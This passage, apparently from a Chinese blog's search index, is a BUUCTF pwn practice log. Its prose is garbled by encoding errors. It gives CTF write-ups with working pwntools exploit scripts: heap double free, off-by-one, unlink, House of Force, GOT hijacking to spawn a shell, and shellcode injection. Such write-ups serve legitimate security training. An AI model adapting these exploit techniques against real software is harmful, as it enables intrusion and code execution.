freeï¼Œå‡è®¾æˆ‘ä»¬è¿ç»­ç”³è¯·å †å—ç”³è¯·åˆ°äº† chunk11ï¼š chunk0 = add(0x78) add(0x18) for i in range(10): add(0x78) æ³¨ï¼šç¬¬äºŒæ¬¡åˆ†é…äº† 0x18 å­—èŠ‚æ˜¯ 64 ä½ä¸‹æœ€å°åˆ†é…å¤§å°ã€‚è¿™ä¸ª chunk1 çš„åˆ†é…æ˜¯ä¸ºäº†è®© unsorted bin ä¸ tcache é”™ä½ã€‚ é‚£ä¹ˆè¿™æ—¶è¿ç»­ä¸¤æ¬¡ free æ‰ chunk11ï¼Œå† add å›æ¥ï¼Œä½¿å¾— chunk11-\u003efd = chunk0-0x10ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨ chunk0-0x10 å¤„ä¼ªé€ äº†ä¸€ä¸ªå †å—ï¼Œå†æ¬¡ add å°±ä¼šåˆ†é…åˆ° chunk0-0x10ï¼Œæ­¤æ—¶å¡«å…¥å‡†å¤‡å¥½çš„ prev_size åŠ chunk_size å³å¯ä¿®æ”¹ chunk0 å¤§å°ã€‚æ³¨æ„ä¸ºäº†ç¡®ä¿é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œchunk_size éœ€å¤§äº 0x400 å­—èŠ‚ã€‚ remove(11) remove(11) add(0x78,p64(chunk0-0x10)) # chunk11-\u003efd = chunk0-0x10 add(0x78,p64(chunk0-0x10)) add(0x78,p64(0)+p64(0x4a1)) éšåæˆ‘ä»¬é‡Šæ”¾ chunk0 å°±ä¼šè¿›å…¥ unsorted binï¼Œè€Œé‡Šæ”¾ chunk1 ä¼šè¿›å…¥ tcache[0]ã€‚æ­¤æ—¶ add å°±ä¼šå¾—åˆ° chunk0ï¼Œå¹¶ä½¿å¾— chunk1-\u003efd = main_arenaï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€æ¬¡ add å¾—åˆ° chunk1ï¼Œä¸‹ä¸€æ¬¡ add å¾—åˆ° main_arenaï¼Œå‡å»åç§»é‡å³ libc åŸºå€ã€‚ remove(0) # unsorted bin remove(1) # tcache[0] add(0x78) # chunk0; chunk1-\u003efd = main_arena add(0x18) # chunk1 main_arena = add(0x18) base = main_arena - 0x3ebca0 leak('base', base) æœ€åå†æ¬¡åˆ©ç”¨ double freeï¼Œç”¨ one_gadget è¦†ç›– free_hookï¼Œå†æ¬¡è°ƒç”¨ remove å³å¯ã€‚ libc = ELF('./libc.so.6') free_hook = base + libc.sym['__free_hook'] one_gadget = base + 0x10a38c add(0x28) remove(18) remove(18) add(0x28, p64(free_hook)) add(0x28, p64(free_hook)) add(0x28, p64(one_gadget)) remove(0) ","date":"2019-12-14","objectID":"/buu-pwn/:2:15","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_es_2 åªèƒ½æº¢å‡º 8 å­—èŠ‚ï¼Œç©ºé—´å¤ªå°ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚å¦‚ä¸‹å¸ƒç½®æ ˆï¼š ret addr ebp-0x2c padding /sh\\x00 /bin ebp-0x1c padding system padding ebp-0x24 padding padding å¾—åˆ°ï¼š sa('name?\\n','a'*0x28) ru('a'*0x28) ebp = uu32(r(4)) leak('ebp', ebp) payload = flat('a'*8,ebp-0x24,'a'*4,elf.plt['system'],'a'*4,ebp-0x1c,'/bin/sh\\x00','a'*4,ebp-0x2c) s(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:16","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"roarctf_2019_easy_pwn æœ¬é¢˜åœ¨ write æ—¶å­˜åœ¨ off_by_one æ¼æ´ï¼š __int64 __fastcall sub_E26(signed int a1, unsigned int a2) { __int64 result; // rax if (a1\u003e (signed int)a2 ) return a2; if (a2 - a1 == 10) LODWORD(result) = a1 + 1; else LODWORD(result) = a1; return (unsigned int)result; } å¦‚æœç¼–è¾‘æ—¶è¾“å…¥çš„ size æ¯”åˆ›å»ºæ—¶çš„ size å¤§ 10ï¼Œå°±å¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚ã€‚è¿™å¤šå‡ºæ¥çš„ä¸€ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ä¸ª chunk çš„ chunk_size å­—æ®µï¼Œä»è€Œä¿®æ”¹å…¶å¤§å°ï¼Œé€ æˆå †å—é‡å ã€‚ é¦–å…ˆè¿ç»­åˆ›å»º 5 ä¸ª chunkï¼Œå…¶ä¸­ç¬¬ 0 ä¸ªçš„å¤§å°å¿…é¡»ä»¥ 8 ç»“å°¾ï¼Œå¦åˆ™åªèƒ½æº¢å‡ºåˆ° prev_size è€Œä¸æ˜¯ chunk_sizeã€‚ç¼–è¾‘ 0 ä¸­æ•°æ®ï¼Œè§¦å‘ off_by_one æ¡ä»¶æº¢å‡ºä¿®æ”¹ 1 çš„å¤§å°ã€‚éšå free(1) ä½¿å…¶å¯¹åº”å¤§å°çš„ chunk è¿›å…¥ unsorted binï¼Œæ­¤æ—¶ 2 çš„ fd å³æŒ‡å‘ main_arena+88ï¼Œä»è€Œå¯ä»¥æ³„éœ² libcã€‚ add(0x58) # 0 for i in range(4): add(0x60) # 1 edit(0, 0x58+10,'a'*0x58+'\\xe1') delete(1) add(0x60) # 1 show(2) # 2 ru('content:') main_arena = uu64(r(6)) - 88 base = main_arena - libc.sym['__malloc_hook'] - 0x10 leak('base', base) æ¥ä¸‹æ¥å…ˆç»•è¿‡ fastbin çš„å¤§å°æ£€æŸ¥ï¼Œéšåå‘ fd å†™å…¥ malloc_hook ä¸Šæ–¹çš„åœ°å€åç”³è¯·å›æ¥ï¼Œä»ç”³è¯·åˆ°çš„åœ°å€å‡ºå‘å¡«å…… 11 å­—èŠ‚åå³å¯ç”¨ one_gadget è¦†ç›– __malloc_hookã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ one_gadget çš„çº¦æŸæ¡ä»¶å¾—ä¸åˆ°æ»¡è¶³ï¼Œå› æ­¤éœ€è¦å…ˆæ‰§è¡Œ __libc_realloc å¯¹ rsp è¿›è¡Œè°ƒæ•´ã€‚æœ€åç”¨ one_gadget è¦†ç›– __realloc_hookã€‚ add(0x60) # 5 (2) delete(2) # bypass fastbin check edit(5,0x8,p64(main_arena-0x33)) # above malloc_hook add(0x60) # 2 add(0x60) # 6 payload = flat('a'*0xb,base+0x4526a,base+libc.sym['realloc']+2) edit(6,len(payload),payload) add(0x18) ","date":"2019-12-14","objectID":"/buu-pwn/:2:17","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_n_3 æœ¬é¢˜ do_new å‡½æ•°å…ˆåˆ›å»º 0xc çš„ chunkï¼ŒåŒ…å«å¡«å……çš„æ•°å­—ã€å¯¹æ•°å­—çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ï¼›è€Œå¦‚æœç”³è¯·çš„æ˜¯ string ç±»å‹ï¼Œä¸”é•¿åº¦ä¸è¶…è¿‡ 0x400 çš„è¯ï¼Œéšåè¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ chunkï¼ŒåŒ…å«å­—ç¬¦ä¸²å†…å®¹ã€å¯¹å­—ç¬¦ä¸²çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ã€‚ è€Œåœ¨ do_del ä¸­ï¼Œfree åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨ uafã€‚å› æ­¤å¯ä»¥å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼ˆæ€»å¤§å°å¤§äº 0xcï¼‰ç„¶åä¾æ¬¡é‡Šæ”¾ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º 0xc çš„å †å—ã€‚é‚£ä¹ˆæ­¤æ—¶å…ˆä¼šæ‹¿å‡º chunk1 çš„ 0xc è¿™ä¸€å—ï¼Œå†æ‹¿å‡º chunk0 çš„ 0xc è¿™ä¸€å—ï¼Œåè€…æ˜¯æˆ‘ä»¬å¯å†™çš„ã€‚ é€šè¿‡é€†å‘å¯çŸ¥ç»“æ„ä½“åç§» 0 å¤„æ˜¯æ‰“å°å‡½æ•°ã€åç§» 4 å¤„æ˜¯é‡Šæ”¾å‡½æ•°ï¼Œé‡Šæ”¾å‡½æ•°çš„å‚æ•°æ˜¯ç»“æ„ä½“æŒ‡é’ˆæœ¬èº«ã€‚é‚£ä¹ˆæˆ‘ä»¬å°† chunk0 çš„æ‰“å°å‡½æ•°å†™æˆ sh\\x00\\x00ï¼ˆæ³¨æ„ 4 å­—èŠ‚ï¼‰ï¼Œé‡Šæ”¾å‡½æ•°ç”¨ system è¦†ç›–ï¼Œé‡Šæ”¾æ—¶å°±ä¼šæ‰§è¡Œ system(\"sh\")ã€‚ def add(index,len,content='a'): sla('CNote\u003e ','1') sla('Index\u003e ',str(index)) sla('Type\u003e ','2') sla('Length\u003e ',str(len)) sla('Value\u003e ',content) def delete(index): sla('CNote\u003e ','2') sla('Index\u003e ',str(index)) add(0,0x10) add(1,0x10) delete(0) delete(1) add(2,0xc,'sh\\x00\\x00'+p32(elf.sym['system'])) # 0xc from 1, then 0xc from 0 delete(0) ","date":"2019-12-14","objectID":"/buu-pwn/:2:18","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"hitcon2014_stkof æœ¬é¢˜å…±å››ä¸ªåŠŸèƒ½ï¼šæ·»åŠ ã€è¯»å…¥å†…å®¹ã€åˆ é™¤ã€æ˜¾ç¤ºã€‚å…¶ä¸­è¯»å…¥å†…å®¹å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæº¢å‡ºå®ç° unlink æ”»å‡»ã€‚ç¨‹åºä¸­å­˜åœ¨å…¨å±€æ•°ç»„ bagï¼Œå­˜æ”¾æ‰€æœ‰ chunk çš„ mem æŒ‡é’ˆã€‚ å…ˆç”³è¯· 3 ä¸ª chunkï¼Œå…¶ä¸­ç¬¬ 1 ä¸ª chunk æ²¡æœ‰ç”¨ï¼Œåªæ˜¯å› ä¸ºå‰ä¸¤ä¸ª chunk ä¸è¿ç»­æ‰€ä»¥æ‰ç”³è¯·çš„ã€‚éšåé€šè¿‡ chunk2 æº¢å‡ºåˆ° chunk3 è¿›è¡Œ unlink æ”»å‡»ï¼Œè¿™æ ·ä¿®æ”¹ bag[2] ç­‰ä»·äºä¿®æ”¹ bag[-1]ï¼Œå¡«å……æ‰ bag[-1] å’Œ bag[0] åï¼Œä»¤ï¼š bag[1] = elf.got['free'] bag[2] = elf.got['fflush']ï¼Œfflush å¯ä»¥æ˜¯ä»»æ„å·²è°ƒç”¨çš„ libc å‡½æ•° bag[3] = elf.got['atoi'] æ­¤æ—¶æˆ‘ä»¬ edit(1) å†™å…¥ elf.plt['puts'] å³å¯åŠ«æŒ free å‡½æ•°åˆ° putsï¼Œé‚£ä¹ˆè°ƒç”¨ delete(2) å°±ä¼šæ‰“å°å‡º fflush åœ°å€ï¼Œä»è€Œæ³„éœ² libcã€‚æœ€å edit(3) å†™å…¥ system åœ°å€ï¼ŒåŠ«æŒ atoi åˆ° systemï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¯»å…¥æŒ‡ä»¤æ—¶ä¼šè°ƒç”¨ atoi(\u0026nptr)ï¼Œæˆ‘ä»¬è¾“å…¥çš„ nptr åªéœ€è¦æ˜¯ /bin/sh å³å¯ getshellã€‚ def add(size): sl('1') sl(str(size)) ru('OK\\n') def delete(index): sl('3') sl(str(index)) def edit(index,content): sl('2') sl(str(index)) sl(str(len(content))) s(content) ru('OK\\n') bag = 0x602140 add(0x80) add(0x80) add(0x80) fd = bag+0x10-0x18 bk = bag+0x10-0x10 payload = flat(0,0x80,fd,bk).ljust(0x80,'a') payload += flat(0x80,0x90) edit(2,payload) delete(3) # bag[2] \u003c-\u003e bag[-1] payload = flat('a'*0x10,elf.got['free'],elf.got['fflush'],elf.got['atoi']) edit(2,payload) edit(1,p64(elf.plt['puts'])) delete(2) # puts(GOT[fflush]) ru('OK\\n') fflush = uu64(r(6)) leak('fflush',fflush) system,binsh = ret2libc(fflush,'fflush') edit(3,p64(system)) sl('/bin/sh\\x00') ","date":"2019-12-14","objectID":"/buu-pwn/:2:19","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Part III ","date":"2019-12-14","objectID":"/buu-pwn/:3:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"sleepyHolder_hitcon_2016 è¿™é“é¢˜å…è®¸ä¿å­˜ small/big/huge secretï¼Œå…¶ä¸­ huge åªèƒ½ä¿å­˜ä¸€æ¬¡ï¼Œä¸èƒ½åˆ é™¤å’Œä¿®æ”¹ï¼Œå¹¶ä¸”åœ¨ä¿å­˜äº†ä¸€ä¸ª small/big ä¹‹åå°±ä¸èƒ½å†ä¿å­˜æ–°çš„ small/big äº†ï¼Œåªèƒ½ renewã€‚ æ˜¾ç„¶è¿™ä¸ª huge å°±æ˜¯æˆ‘ä»¬æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒã€‚å®é™…ä¸Šï¼Œhuge çš„èŒƒå›´å±äº large binï¼Œåœ¨ç”³è¯·è¿™ä¹ˆå¤§çš„ chunk æ—¶å¦‚æœ unsorted bin ä¸­æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„ï¼Œå°±ä¼šè§¦å‘ malloc_consolidate()ï¼Œä½¿ fastbin ä¸­çš„ chunk åˆå¹¶è¿›å…¥ unsorted binï¼Œæœ€ç»ˆæ ¹æ®åˆå¹¶åçš„å¤§å°è¿›å…¥ small bin æˆ– large binã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨å…ˆç”³è¯·ä¸€ä¸ª smallï¼Œç„¶åç”³è¯· big é˜²æ­¢ small è¢«é‡Šæ”¾æ—¶ä¸ top chunk åˆå¹¶ï¼Œå†é‡Šæ”¾ smallã€‚æ­¤æ—¶ small è¿›å…¥ fastbinï¼Œå†ç”³è¯· huge å³å¯è®© small è¿›å…¥åˆ° small binã€‚ ç”±äºè¿™æ—¶ small å·²ç»ä¸å¤„äº fastbin é“¾è¡¨å¤´äº†ï¼Œæ‰€ä»¥å†æ¬¡é‡Šæ”¾å¹¶ä¸ä¼šå‡ºé”™ï¼Œé€ æˆ double freeã€‚è¿™æ ·ä¹‹ååœ¨ small å†…ä¼ªé€  chunk å¹¶ unlink åŠ«æŒ GOT è¡¨å³å¯ã€‚ add(1) add(2) delete(1) # 1-\u003efastbin add(3) # consolidate,1-\u003eunsorted bin-\u003esmallbin delete(1) small_secret = 0x6020d0 fd = small_secret - 0x18 bk = small_secret - 0x10 payload = flat(0,0x21,fd,bk,0x20) add(1,payload) delete(2) # ?,big,huge,small,big_flag,huge_flag,small_flag payload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3 edit(1,payload) edit(1,p64(elf.plt['puts'])) # free -\u003e puts delete(2) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,'atoi') edit(1,p64(system)) add(2,'/bin/sh\\x00') delete(2) ","date":"2019-12-14","objectID":"/buu-pwn/:3:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"secretHolder_hitcon_2016 ç±»ä¼¼ä¸Šä¸€é¢˜ï¼Œä¸è¿‡ huge å¯ä»¥ä¿®æ”¹å’Œåˆ é™¤äº†ã€‚ç”±äº huge éå¸¸å¤§ï¼Œåˆ†é…æ—¶ä¼šè°ƒç”¨ mmap()ï¼Œä½†æ˜¯å½“é‡Šæ”¾æ‰ huge å†ç”³è¯·æ—¶ï¼Œmmap_threshold å·²ç»å˜å¾—å’Œ huge ä¸€æ ·å¤§ï¼Œæ­¤æ—¶åˆ†é… huge ä½¿ç”¨çš„æ˜¯ brk()ï¼Œå› æ­¤ huge è¢«åˆ†é…åˆ°äº†å †ä¸Šã€‚ åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä»¤ small å’Œ huge åœ°å€é‡åˆï¼Œéšååœ¨ä¸‹é¢å«ä¸Š bigã€‚åœ¨ small é‡Œä¼ªé€ å †å—å¹¶é‡Šæ”¾ bigï¼Œè§¦å‘ unlinkï¼Œå‰©ä½™çš„å·¥ä½œå°±å’Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·äº†ã€‚ def add(type,content='a'): sla('Renew secret\\n','1') sla('Huge secret\\n',str(type)) sa(': \\n',content) def delete(type): sla('Renew secret\\n','2') sla('Huge secret\\n',str(type)) def edit(type,content): sla('Renew secret\\n','3') sla('Huge secret',str(type)) sa(': \\n',content) add(1) add(2) delete(1) delete(2) add(3) delete(3) # mmap threshold +++ add(3) # brk() delete(1) add(1) # small \u003c-\u003e huge add(2) small = 0x6020b0 fd = small-0x18 bk = small-0x10 payload = flat(0,0x21,fd,bk,0x20,0x90,'a'*0x80) payload += flat(0,0x21,'a'*0x10,0,0x21) edit(3,payload) delete(2) # ?,big,huge,small,big_flag,huge_flag,small_flag payload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3 edit(1,payload) edit(1,p64(elf.plt['puts'])) # free -\u003e puts delete(2) atoi = uu64(r(6)) system,binsh = ret2libc(atoi,'atoi') edit(1,p64(system)) add(2,'/bin/sh\\x00') delete(2) ","date":"2019-12-14","objectID":"/buu-pwn/:3:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"bcloud_bctf_2016 åœ¨è¯»å…¥åå­—å’Œè¯»å…¥ Org ä»¥åŠ Host æ—¶ï¼Œå‡å­˜åœ¨åŒæ ·çš„ strcpy æ¼æ´ï¼Œå‰è€…å¯¼è‡´æ³„éœ²å †åœ°å€ï¼Œè€Œåè€…å…è®¸æˆ‘ä»¬ off-by-one ä¿®æ”¹ top chunk çš„å¤§å°ï¼Œä»è€Œå®ç° House of Forceã€‚é€šè¿‡ gdb è°ƒè¯•å¾—åˆ° top_chunk = heap + 0xd0ï¼Œé‚£ä¹ˆæ„é€ çš„ evil_size å°±æ˜¯æˆ‘ä»¬æƒ³åˆ†é…åˆ°çš„ note_len æ•°ç»„åœ°å€å‡å» header çš„ 0x8ï¼Œå‡å» old_top_chunk åœ°å€ï¼Œå†å‡å» 12ï¼Œè¿™æ˜¯å› ä¸ºå·²ç»åˆ†é…äº†ä¸‰ä¸ªå †å—ï¼Œåœ¨ç¨‹åºä¸­æ¯ä¸ªå †å—é¢å¤–åˆ†é…äº† 4Bã€‚æœ€åä» note_len è¦†ç›–åˆ° note æ•°ç»„ï¼ŒåŠ«æŒ free åˆ° printf æ³„éœ² libcï¼Œå†åŠ«æŒ atoi åˆ° systemã€‚ def add(len,content='a'): sla('\u003e\u003e\\n','1') sla(':\\n',str(len)) sa(':\\n',content) def delete(index): sla('\u003e\u003e\\n','4') sla(':\\n',str(index)) def edit(index,content): sla('\u003e\u003e\\n','3') sla(':\\n',str(index)) sla(':\\n',content) sa('name:\\n','a'*0x40) ru('a'*0x40) heap = uu32(r(4)) leak('heap',heap) sa('Org:\\n','a'*0x40) sla('Host:\\n',p32(0xffffffff)) note_len = 0x804b0a0 note = 0x804b120 top_chunk = heap + 0xd0 evil_size = note_len-0x8-top_chunk-0xc # gdb add(evil_size,'') payload = flat((note-note_len)*'a',elf.got['atoi'],elf.got['free'],elf.got['atoi']) add(len(payload),payload) edit(1,p32(elf.plt['printf'])) delete(0) # printf(atoi.got) atoi = uu32(r(4)) system,binsh = ret2libc(atoi,'atoi') edit(2,p32(system)) sla('\u003e\u003e\\n','/bin/sh\\x00') ","date":"2019-12-14","objectID":"/buu-pwn/:3:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"lctf2016_pwn200 é¦–å…ˆä¸éš¾å‘ç°è¯»å…¥ name æ—¶å­˜åœ¨ off-by-oneï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²æ ˆåœ°å€ã€‚ä¸ºäº†åé¢ ret2shellcodeï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨ name é‡Œé¡ºä¾¿å†™å¥½ shellcodeï¼š payload = asm(shellcraft.sh()).ljust(48,'a') sa('u?\\n',payload) ru(payload) rbp = uu64(ru(', w',True)) leak('rbp',rbp) è€Œè¯»å…¥ money æ—¶ï¼Œæ°å¥½å¯ä»¥è¦†ç›–åˆ°å †æŒ‡é’ˆ destã€‚é‚£ä¹ˆå¯ä»¥è¦†ç›– dest ä¸ºæˆ‘ä»¬ä¼ªé€ çš„ chunkï¼ŒåŒæ—¶å‡†å¤‡å¥½ idï¼ˆåªéœ€è¦å¤§äº 0x10 å°äº 0x21000 å³å¯ï¼‰ä½œä¸º nextsizeï¼Œè¿™æ ·å°±å¯ä»¥å…ˆé‡Šæ”¾å†ç”³è¯·è¿™ä¸ª fake chunkï¼Œå°±å¯ä»¥æ§åˆ¶ rip äº†ï¼Œæœ€åè¦†ç›– rip ä¸º shellcode åœ°å€ã€‚ é€šè¿‡ gdb è°ƒè¯•ï¼Œå¯ä»¥ç»˜åˆ¶å¤§è‡´çš„æ ˆç»“æ„å›¾ï¼š ------------ \u003c- leaked rbp | | 0x20 ------------ \u003c- rbp | shellcode | 0x30 ------------ \u003c- shellcode_addr -- | 0x20 | id | ------------ | | | | ------------ | | rip | | 0x40 ------------ | | rbp | | ------------ | | dest | | ------------ \u003c- fake -- | 0x41 | ------------ | prev_size | ------------ | ... | ç”±æ­¤å¯ä»¥å¾—åˆ°ï¼š sc = rbp-0x50 fake = rbp-0x90 ä»è€Œä¼ªé€ å †å—ï¼š sla('id ~~?\\n',str(0x20)) sa('money~\\n',p64(0)*4+flat(0,0x41,0,fake)) sla('choice :','2') # free sla('choice :','1') # malloc sla('long?',str(0x30)) # + 0x10 = 0x40 ru('48') sl(flat('a'*0x18,sc)) sla('choice :','3') ","date":"2019-12-14","objectID":"/buu-pwn/:3:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"zctf2016_note2 æ·»åŠ  note æ—¶ï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯¼è‡´æ·»åŠ å¤§å°ä¸º 0 çš„ noteï¼Œå¯ä»¥è¾“å…¥çš„é•¿åº¦ä¸ºæ— ç¬¦å·çš„ -1ï¼Œå¯ä»¥è®¤ä¸ºæ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯ malloc ä¾æ—§ä¼šåˆ†é… 0x20 å­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸‰ä¸ª chunkï¼š | ... | | ------------------- | | 'a'*8 | | ------------------- \u003c- ptr[2] chunk2 | size=0x91 | | ------------------- | | prev_size | | ------------------- \u003c--------------- | | | ------------------- | | 'a'*8 | | ------------------- \u003c- ptr[1] chunk1 | size=0x20 | | ------------------- | | prev_size | | ------------------- \u003c--------------- | | 0x18 | ------------------- | | bp_prev_size=0x60 | | ------------------- | | 'a'*0x40 | 0x40 | ------------------- | | fd | bk | 0x10 | ------------------- chunk0 | fake_size=0x61 | | ------------------- | | fake_prev_size=0 | | ------------------- \u003c- ptr[0] | | size=0x91 | | ------------------- | | prev_size | | ------------------- \u003c--------------- æˆ‘ä»¬åœ¨ 0x80 çš„ chunk0 å†…ä¼ªé€ äº† 0x61 çš„ chunkï¼Œå¹¶é€šè¿‡ bp_prev_size=0x60 ç¡®ä¿èƒ½é€šè¿‡æ£€æŸ¥ã€‚éšååˆ†é…å¤§å°ä¸º 0 çš„ chunk1ï¼ˆå®é™…å¤§å°ä¸º 0x20ï¼‰ï¼Œç”±äºæ•´æ•°æº¢å‡ºè¿™é‡Œå¯ä»¥è¾“å…¥æ— é™é•¿åº¦çš„å†…å®¹ï¼Œæœ€ååˆ†é… 0x80 çš„ chunk2 ç”¨æ¥å¼•èµ· unlinkã€‚ æ¥ä¸‹æ¥é‡Šæ”¾ 1 å†æ‹¿å›æ¥ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ° chunk2ï¼Œä¿®æ”¹å…¶ prev_size å’Œ chunk_sizeï¼Œå‰è€…ä¿®æ”¹ä¸º 0x20+0x80=0xa0ï¼Œåè€…ç½® PREV_IN_USE ä½ä¸º 0ã€‚è¿™æ ·å†é‡Šæ”¾ 2 å°±å¯ä»¥ unlink æ‰æˆ‘ä»¬çš„ fake chunk äº†ã€‚æ­¤æ—¶ ptr æŒ‡å‘ ptr-0x18ï¼Œå¡«å…… 0x18 å­—èŠ‚åå³å¯ä¿®æ”¹ ptr[0]ï¼Œä¹‹åå°±æ˜¯å¸¸è§„ GOT åŠ«æŒäº†ã€‚ def add(len,content='a'*8): sla('\u003e\u003e','1') sla('128)',str(len)) sla('content:',content) def show(index): sla('\u003e\u003e','2') sla('note:',str(index)) def edit(index,choice,content): sla('\u003e\u003e','3') sla('note:',str(index)) sla(']',str(choice)) sl(content) def delete(index): sla('\u003e\u003e','4') sla('note:',str(index)) sla('name:','merc') sla('address:','privacy') ptr = 0x602120 fd = ptr-0x18 bk = ptr-0x10 payload = flat('a'*8,0x61,fd,bk,'a'*0x40,0x60) add(0x80,payload) # 0 add(0) # 1,0x20 add(0x80) # 2 delete(1) # padding,prev_size=0x20+0x80,PREV_IN_USE=0 add(0,flat('a'*0x10,0xa0,0x90)) delete(2) payload = flat('a'*0x18,elf.got['atoi']) edit(0,1,payload) show(0) ru('is') atoi = uu64(r(6)) system,binsh = ret2libc(atoi,'atoi') edit(0,1,p64(system)) sla('\u003e\u003e','/bin/sh\\x00') ","date":"2019-12-14","objectID":"/buu-pwn/:3:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"zctf2016_note3 è¿™é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œä¸è¿‡ bss ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š current_ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size æœ¬é¢˜æ¼æ´åœ¨äº edit æ—¶ä¼šåˆ¤æ–­è¾“å…¥çš„é•¿åº¦æ˜¯å¦å°äº 0ï¼Œå¦‚æœæ˜¯å°±å–ç›¸åæ•°ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œè¾“å…¥ 0x8000000000000000ï¼Œå®ƒçš„ç›¸åæ•°æ°å¥½æ˜¯å®ƒè‡ªèº«ï¼Œå¹¶ä¸”ä¾ç„¶æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼ˆ-1ï¼‰ã€‚è¿™æ ·å°±é€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¦†ç›–åˆ° current_ptrã€‚ æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆè®© current_ptr æŒ‡å‘ note3ï¼Œç„¶ååˆ©ç”¨è¶Šç•Œè¦†ç›–ä¸€ä¸ª fake_chunk åˆ° note3 ä¸Šï¼Œå†é‡Šæ”¾ note4 è§¦å‘ unlinkï¼Œæ­¤æ—¶ note3_ptr æŒ‡å‘ note0_ptrï¼Œè¿™æ ·å°±å¯ä»¥å®ç° GOT åŠ«æŒã€‚ ä½†æ˜¯æœ¬é¢˜çš„ show åŠŸèƒ½è¢«ç¦ç”¨ï¼Œè€Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ² libc 